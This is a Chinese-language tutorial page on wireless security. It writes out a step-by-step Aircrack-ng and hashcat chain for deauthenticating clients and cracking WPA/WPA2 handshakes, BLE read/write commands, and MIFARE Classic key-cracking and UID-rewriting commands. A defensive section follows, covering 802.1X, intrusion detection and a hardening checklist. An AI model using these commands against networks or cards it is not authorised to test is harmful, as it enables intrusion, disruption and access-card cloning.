# 无线网络安全

> WiFi/Bluetooth/RFID 无线协议的攻击与防御。

---

## WiFi 安全攻击全景

### 加密协议演进

```
WEP  (1997) ❌  已完全破解（Aircrack-ng 秒破）
WPA  (2003) ❌  TKIP 已被破解
WPA2 (2004) ⚠️  KRACK 攻击可破解
WPA3 (2018) ✅  当前最安全（仍需防暴力破解）
```

### Aircrack-ng 全套攻击

```bash
# 1. 开启监听模式
airmon-ng start wlan0
# 监听接口变为 wlan0mon

# 2. 扫描附近 WiFi
airodump-ng wlan0mon

# 3. 捕获握手包（指定 BSSID + 信道）
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 解除认证攻击（强制客户端重新连接，捕获握手）
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# 5. 破解密码
aircrack-ng -w rockyou.txt capture-01.cap

# 6. GPU 加速破解（hashcat）
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx rockyou.txt --force
hashcat -m 22000 capture-01.cap rockyou.txt  # PMKID
```

### WPA3 攻击

```bash
# 降级攻击（将 WPA3 降为 WPA2）
# 利用 WPA3 过渡模式（同时支持 WPA2/WPA3）
# 设置 fake AP 为 WPA2 → 客户端自动降级

# Dragonblood 漏洞
# CVE-2019-9494: SAE 侧信道攻击
# CVE-2019-13377: WPA3 定时攻击
```

## 蓝牙（BLE）安全

| 攻击 | 说明 | 工具 |
|------|------|------|
| BlueBorne | 远程代码执行 | BlueBorne 检测器 |
| KNOB | 降低加密密钥 | kno-buster |
| BIAS | 绕过身份验证 | BIAS PoC |
| BLE 嗅探 | 捕获蓝牙数据包 | BlueZ + Wireshark |
| BLE 欺骗 | 伪造 BLE 设备 | gatttool |

```bash
# BLE 扫描
sudo hcitool lescan
sudo bluetoothctl scan on

# BLE 服务发现
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --characteristics

# BLE 数据读写
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0025
gatttool -b AA:BB:CC:DD:EE:FF --char-write -a 0x0025 -n [hex_data]

# Bettercap BLE 模块
sudo bettercap -eval "ble.recon on"
```

## RFID/NFC 安全

```bash
# 读取 MIFARE Classic 卡
# 已知密钥攻击
mfoc -O dump.mfd -k FFFFFFFFFFFF

# 硬暴力破解（需 Proxmark3）
hf mf mifare -k FFFFFFFFFFFF

# NFC 数据读取
nfctool --list -v
nfc-poll  # 轮询标签
nfc-mfsetuid -U NEW_UID dump.mfd  # 写 UID
```

## 企业级无线防御

### 802.1X 配置

```yaml
企业 WPA2-Enterprise（RADIUS 认证）:
  认证: EAP-TLS（证书）/ PEAP-MSCHAPv2
  加密: CCMP (AES)
  安全关注:
    - RADIUS 服务器安全配置（防止凭据泄露）
    - 客户端证书注销机制
    - 恶意 AP 检测（WIDS/WIPS）
```

### 无线入侵检测

```bash
# 使用 WIDS 检测恶意 AP
# Kismet（开源 WIDS）
sudo kismet -c wlan0mon

# 检测指标
# - 信号强度异常（恶意 AP 可能靠近强信号）
# - 相同 SSID 不同 BSSID（Evil Twin）
# - 异常的信道切换模式
# - Deauth 攻击告警
```

### 无线安全检查清单

```
[ ] WPA3 已启用（不使用 WPA2 过渡模式）
[ ] 访客网络与内部网络隔离
[ ] 802.1X 证书已配置并定期轮换
[ ] 隐藏 SSID（仅防普通人，不增加实质安全）
[ ] MAC 过滤列表维护（非主要安全手段）
[ ] BLE 设备固件定期更新
[ ] RFID 卡升级为 MIFARE DESFire
[ ] WIDS/WIPS 部署覆盖
```

*下一篇：[无线安全进阶：WiFi 与蓝牙攻击](02-wireless-advanced.md)*
